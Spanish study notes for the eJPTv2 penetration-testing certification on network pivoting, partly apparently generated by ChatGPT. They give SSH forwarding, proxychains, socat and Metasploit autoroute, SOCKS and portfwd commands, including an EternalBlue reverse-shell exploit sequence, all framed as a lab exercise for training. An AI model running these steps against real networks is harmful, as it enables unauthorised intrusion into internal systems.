#apuntes #certificacion #eJPT

# üîÑ Pivoting (eJPTv2)

> **Definici√≥n**: Pivoting es el proceso de usar una m√°quina comprometida como puente para acceder a otras m√°quinas o redes internas que desde tu atacante (Kali) **no son accesibles directamente**.

Es un paso habitual despu√©s de obtener shell en una m√°quina expuesta.

---

## üéØ Objetivo del Pivoting

- **Acceder a redes internas** no expuestas al atacante.
    
- **Enumerar y explotar** hosts que solo son visibles desde la m√°quina comprometida.
    
- **Extender alcance** ‚Üí desde una primera v√≠ctima (‚Äúfoothold‚Äù) hacia toda la red interna.

---

## üåê Conceptos b√°sicos

- **Pivot host**: m√°quina comprometida usada como punto de salto.
    
- **Redes internas**: subredes solo accesibles desde el pivot host.
    
- **Pivoting** ‚â† **tunneling**:
    
    - Pivoting ‚Üí encaminar tr√°fico a trav√©s de una m√°quina intermedia.
        
    - Tunneling ‚Üí encapsular/proxy el tr√°fico en otro protocolo (ej. HTTP tunnel, DNS tunnel).
        

En eJPT suele bastar con pivoting sencillo (SSH / Proxychains / Socat / Metasploit).

---

## üõ†Ô∏è T√©cnicas de Pivoting comunes

### 1. SSH Pivoting (Local / Remote / Dynamic)

#### üîπLocal Port Forward (LPortFwd)

- Redirige un puerto de tu Kali a uno accesible solo desde la v√≠ctima.
    

`ssh -L 8080:10.0.0.5:80 user@victima`

Ahora, desde Kali: `http://127.0.0.1:8080` ‚Üí corresponde a `10.0.0.5:80` (red interna).

#### üîπRemote Port Forward (RPortFwd)

- Abre un puerto en la m√°quina v√≠ctima que redirige hacia tu Kali.
    

`ssh -R 8080:127.0.0.1:80 user@victima`

#### üîπDynamic Port Forward (SOCKS Proxy)

- M√°s flexible, crea un proxy SOCKS para enrutar tr√°fico arbitrario.
    

`ssh -D 9050 user@victima`

- Luego, en Kali: editar `/etc/proxychains4.conf` ‚Üí a√±adir `socks5 127.0.0.1 9050`.
    
- Usar con Proxychains:
    

`proxychains nmap -sT -Pn 10.0.0.0/24 proxychains firefox http://10.0.0.5`

---

### 2. Proxychains

- Permite encadenar conexiones a trav√©s de un proxy SOCKS.
    
- Muy usado tras `ssh -D` o cuando configuramos t√∫neles con Metasploit o Socat.
    

Archivo: `/etc/proxychains4.conf`

`socks5 127.0.0.1 9050`

Uso:

`proxychains <comando> proxychains nmap -sT 10.0.0.0/24 proxychains smbclient -L 10.0.0.5 -U usuario`

---

### 3. Socat (t√∫neles simples)

Socat puede crear t√∫neles entre puertos (√∫til si no tienes SSH).

Ejemplo: exponer puerto interno 3306 (MySQL) a tu Kali:  
En la m√°quina pivot (victima):

`socat TCP-LISTEN:3306,fork TCP:10.0.0.5:3306`

En Kali:

`socat TCP-LISTEN:3306,fork TCP:victima:3306`

Ahora puedes usar `mysql -h 127.0.0.1 -P 3306`.

---

### 4. Metasploit Pivoting

Si usas Meterpreter:

`run autoroute -s 10.0.0.0/24      # a√±adir ruta interna use auxiliary/server/socks_proxy  # levanta proxy SOCKS set SRVPORT 1080 run`

Despu√©s:  
Configura Proxychains en Kali ‚Üí `socks4 127.0.0.1 1080`.

Ahora puedes pivotar cualquier herramienta a trav√©s de ese proxy.

---

## üîé Enumeraci√≥n en redes pivotadas

Una vez configurado el pivoting, **repite la enumeraci√≥n interna** en la red nueva:

- `proxychains nmap -sT -Pn 10.0.0.0/24`
    
- `proxychains smbclient -L 10.0.0.5`
    
- `proxychains rdesktop 10.0.0.10`



---
[cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)")
# EJERCICIO CON METASPLOIT

Tienes una m√°quina comprometida (host _pivot_) que tiene **acceso a otra red interna** (p. ej. red `10.0.4.0/24`) donde hay un servicio/host objetivo (p. ej. `10.0.4.3`). Desde tu Kali (atacante) quieres alcanzar esa red interna usando la sesi√≥n Meterpreter sobre el host pivot ‚Äî es decir, **usar el host comprometido como puerta de enlace** para escanear/abrir servicios internos o acceder a una web interna.

(El ejercicio est√° pr√°cticamente calcado del _Pivoting/Exploitation_ lab de UTEP: comprometer host ‚Üí crear rutas/proxies ‚Üí usar navegador o nmap a trav√©s del pivot). ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))

---

## Topolog√≠a de ejemplo (lab)

- **Atacante (Kali)** ‚Äî IP p√∫blica/host atacante
    
- **Host pivot** (comprometido) ‚Äî tiene 2 interfaces: externa (reachable desde Kali) e interna (conectada a la red `10.0.4.0/24`)
    
- **Target interno** ‚Äî `10.0.4.3` (servicio HTTP/RDP/SMB, etc.)
    

---

## Flujo general (resumen)

1. Obtener **Meterpreter** en el host pivot.
    
2. Habilitar **ruteo** en Metasploit (autoroute / route add) para que msf conozca la subred interna.
    
3. Exponer un **SOCKS proxy** desde msf (auxiliary/server/socks4a) o crear **port forwards** (meterpreter `portfwd`) seg√∫n necesidad.
    
4. Desde Kali: usar `proxychains` o configurar el navegador para usar SOCKS y as√≠ conectar a `10.0.4.3` (o usar `nmap` a trav√©s del proxy o hacer `curl`/browser).
    
5. Explorar/atacar el host interno desde tu Kali _a trav√©s_ del pivot. ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))
    

---

## Paso a paso detallado y comandos

> Asumo que ya tienes una sesi√≥n Meterpreter abierta (session `1`). Si no, el primer paso es explotarlo (ejemplo r√°pido):

```text
# en msfconsole
use exploit/windows/smb/ms17_010_eternalblue   # ejemplo
set RHOST 192.0.2.50
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <tu-IP>
exploit
# -> cuando se abra la session: background para seguir en msfconsole
```

### 1) Ver informaci√≥n b√°sica de la sesi√≥n

```text
sessions -i 1
# dentro meterpreter:
meterpreter> sysinfo
meterpreter> ipconfig       # o ifconfig (seg√∫n SO)
```

### 2) A√±adir la ruta (metasploit routing)

Tienes dos opciones: **manual `route add`** o usar el m√≥dulo `post/multi/manage/autoroute`.

#### üîπOpci√≥n A ‚Äî route add (manual)

En msfconsole (no dentro de meterpreter):

```text
# indica a msf que la subred 10.0.4.0/24 es accesible a trav√©s de la session 1
route add 10.0.4.0 255.255.255.0 1
# listar rutas:
route
```

#### üîπOpci√≥n B ‚Äî m√≥dulo autoroute

```text
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.0.4.0
set NETMASK 255.255.255.0
run
```

(esto configura autom√°ticamente la ruta y algunos helpers). Ambos m√©todos permiten que msf enrute tr√°fico hacia esa subred a trav√©s de la session. ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))

### 3) Levantar un SOCKS proxy (muy pr√°ctico)

En msfconsole, crea un servidor SOCKS que haga proxy por msf (soporta socks4a, √∫til para resoluci√≥n DNS remota):

```text
use auxiliary/server/socks4a
set SRVPORT 1080
run
```

- Esto har√° que en tu Kali quede un SOCKS en `127.0.0.1:1080` que redirige tr√°fico a trav√©s del/las sesiones activas/rutas a√±adidas en msf. (Una alternativa es `auxiliary/server/socks5` seg√∫n versi√≥n). ([Null Sweep](https://nullsweep.com/pivot-cheatsheet-for-pentesters/?utm_source=chatgpt.com "A Pivot Cheatsheet for Pentesters - Null Sweep"))
    

#### üîπUsarlo desde Kali

- Opci√≥n A ‚Äî `proxychains` (configura `/etc/proxychains.conf` con `socks4 127.0.0.1 1080`):
    

```bash
proxychains nmap -sT -Pn -n -p- 10.0.4.3       # nmap a trav√©s de SOCKS (con limitaciones)
proxychains firefox   # abre navegador e intenta http://10.0.4.3
```

- Opci√≥n B ‚Äî configurar directamente el navegador para usar SOCKS4 127.0.0.1:1080 (ver UTEP exercise). ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))
    

> Nota: `proxychains + nmap -sS` no funcionar√° bien con SOCKS; usa `-sT` o herramientas que funcionen por SOCKS, o usa `nmap --proxy`/scripting adaptado.

### 4) Port forwarding con Meterpreter (cuando quieras exponer un puerto puntual)

Si s√≥lo te interesa un puerto (ej. RDP 3389) en `10.0.4.3`, puedes forwardearlo hacia tu m√°quina:

En meterpreter:

```text
meterpreter> portfwd add -l 3389 -p 3389 -r 10.0.4.3
# ahora, en Kali:
rdesktop 127.0.0.1:3389   # o mstsc si se da el caso
```

`-l` es el puerto local, `-p` el puerto remoto en destino, `-r` el host remoto dentro de la red a la que accede el pivot. El `portfwd` es local al proceso msf, y es √∫til para exponer un puerto espec√≠fico sin crear un proxy general. ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))

### 5) Escaneo/descubrimiento interno (ejemplos)

- Con ruta a√±adida: desde msf se pueden lanzar m√≥dulos o desde Kali usar proxychains para herramientas orientadas a TCP.
    
- Ejemplo con nmap v√≠a SOCKS (limitado): `proxychains nmap -sT -Pn -p80,443 10.0.4.3`
    
- O desde msf: usar `db_nmap` si importas la ruta a la db de msf (requiere que msf enrute tr√°fico).
    

---

## Pistas, problemas comunes y recomendaciones pr√°cticas

- **DNS/resoluci√≥n:** SOCKS4a permite que la resoluci√≥n DNS la haga el pivot (√∫til si Kali no resuelve nombres internos). ([Wikipedia](https://en.wikipedia.org/wiki/SOCKS?utm_source=chatgpt.com "SOCKS"))
    
- **`nmap`/raw TCP en SOCKS:** algunos tipos de scan no funcionan bien sobre SOCKS; `-sT` es la opci√≥n m√°s segura con proxy.
    
- **`route add` vs `autoroute`**: `autoroute` es c√≥modo para a√±adir autom√°ticamente, `route add` te da control manual.
    
- **Evita escaneos ruidosos en producci√≥n**: en lab est√° bien, en producci√≥n podr√≠as crear alertas.
    
- **Persistencia/limpieza**: recuerda eliminar rutas y portforwards al terminar.
    

---

## Ejercicio reproducible (mini-lab, copia r√°pida)

1. Prepara 3 VMs: Kali (atta), Windows1 (pivot) con 2 NICs (NAT + InternalNet), Windows2 (target) en InternalNet (`10.0.4.3`).
    
2. Explotar Windows1 y obtener Meterpreter.
    
3. En msfconsole: `route add 10.0.4.0 255.255.255.0 1` (o `use post/multi/manage/autoroute ‚Ä¶ run`).
    
4. `use auxiliary/server/socks4a` ‚Üí `set SRVPORT 1080` ‚Üí `run`.
    
5. Configura Firefox en Kali a usar `SOCKS4 127.0.0.1:1080` ‚Üí abrir `http://10.0.4.3`.
    
6. Alternativa: `meterpreter> portfwd add -l 3389 -p 3389 -r 10.0.4.3` ‚Üí conectar RDP a `127.0.0.1:3389`.  
    (La gu√≠a del ejercicio UTEP te da los pasos detallados y pantallazos ‚Äî es un recurso ideal para practicar). ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))
    

---

# ¬øEs Metasploit pivoting ‚Äúel pivoting m√°s com√∫n‚Äù dentro del eJPTv2?

- **S√≠ y no (matizado).** En t√©rminos de **lo que te piden demostrar en eJPTv2** es muy habitual que esperen que sepas **el concepto de pivoting** y **al menos 1‚Äì2 t√©cnicas pr√°cticas**. Metasploit/`meterpreter` (autoroute/route/portfwd + SOCKS) es **una t√©cnica ampliamente ense√±ada** y, por su facilidad, suele aparecer en labs y material de pr√°ctica. Para el examen te viene bien dominarla. ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))
    
- **Pero no es la √∫nica ni siempre la mejor**: otras t√©cnicas comunes que tambi√©n deber√≠as conocer/practicar para eJPT:
    
    - **SSH tunneling** (`ssh -L`, `ssh -R`, dynamic SOCKS `ssh -D`) ‚Äî muy frecuente en labs y real world.
        
    - **ProxyChains / socat / chisel / sslh / plink** ‚Äî √∫tiles para distintos escenarios.
        
    - **VPN pivoting o abuso de Docker sockets** ‚Äî t√©cnicas m√°s avanzadas pero tambi√©n vistas en CTFs/labs.
        
    
    En resumen: **domina Metasploit pivoting** (porque es eficiente y did√°ctico) **pero practica al menos SSH tunneling y port forwarding manual** ‚Äî as√≠ cubres lo que probablemente aparezca en el eJPTv2.
    

---

# Recursos para practicar (lectura + labs)

- Ejercicio PDF (pivoting step-by-step) ‚Äî UTEP: _PivotingExploitation_Exercise.pdf_. Buen lab reproducible. ([cs.utep.edu](https://www.cs.utep.edu/CFIA/files/outreach/PivotingExploitation/PivotingExploitation_Exercise.pdf?utm_source=chatgpt.com "Your goal is to access an internal webserver (10.0.4.3)"))
    
- Cheatsheet de pivoting (varios m√©todos): Nullsweep pivot cheatsheet. ([Null Sweep](https://nullsweep.com/pivot-cheatsheet-for-pentesters/?utm_source=chatgpt.com "A Pivot Cheatsheet for Pentesters - Null Sweep"))
    
- Documentaci√≥n / lectura sobre SOCKS (c√≥mo funciona SOCKS4a/5) ‚Äî Wikipedia (√∫til para entender por qu√© usar socks4a para DNS). ([Wikipedia](https://en.wikipedia.org/wiki/SOCKS?utm_source=chatgpt.com "SOCKS"))
    

---

# Recomendaciones finales para eJPTv2

1. Practica **meterpreter ‚Üí route/autoroute ‚Üí SOCKS ‚Üí proxychains/browser** (hazlo hasta que sea rutina).
    
2. Practica **ssh -D / ssh -L** (pivoting sin Metasploit).
    
3. Sabr√°s explicar en el informe: qu√© hiciste, por qu√© usaste SOCKS vs portfwd, y qu√© limitaciones te encontraste (DNS, nmap sobre socks, permisos).
    
4. Lleva l√≠mites de tiempo: en examen prueba primero el m√©todo r√°pido (SOCKS + navegador) para abrir el objetivo; si falla, prueba `portfwd`.
    

---

Si quieres, te preparo ahora **un playbook de comandos (copy-paste)** listo para tu Kali con las variantes (autoroute, route add, socks4a, portfwd y ejemplos de proxychains/nmap), o un mini-lab `Vagrant`/`docker-compose` reproducible con 3 m√°quinas para que practiques exactamente el flujo. ¬øCu√°l prefieres?